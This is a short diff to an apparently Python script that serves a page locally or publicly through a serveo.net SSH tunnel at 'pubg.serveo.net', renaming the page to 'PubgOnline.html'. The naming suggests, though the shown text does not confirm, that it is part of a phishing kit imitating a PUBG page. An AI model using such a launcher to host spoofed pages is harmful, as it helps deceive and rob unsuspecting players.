@@ -29,14 +29,14 @@ def banner():
 def local():
 	port = input(f"{Blue}Enter a port : {Reset}")
 	print(f"{Blue}Running Server locally..{Reset}")
-	print(f"{Blue}Link : localhost:{port}/test.html{Reset}")
+	print(f"{Blue}Link : localhost:{port}/PubgOnline.html{Reset}")
 	os.system(f"php -S localhost:{port}")
 
 
 def over_wan():
 	port = input(f"{Blue}Enter a port : {Reset}")
 	print(f"{Blue}Running server over Internet...{Reset}")
-	print(f"Link : https://pubg.serveo.net/test.html")
+	print(f"Link : https://pubg.serveo.net/PubgOnline.html")
 
 	os.system(f"nohup php -S localhost:{port} -t core/ > php.log 2>&1 &")
 	os.system(f"nohup ssh -R pubg:80:localhost:{port} serveo.net > ssh.log 2>&1 &")
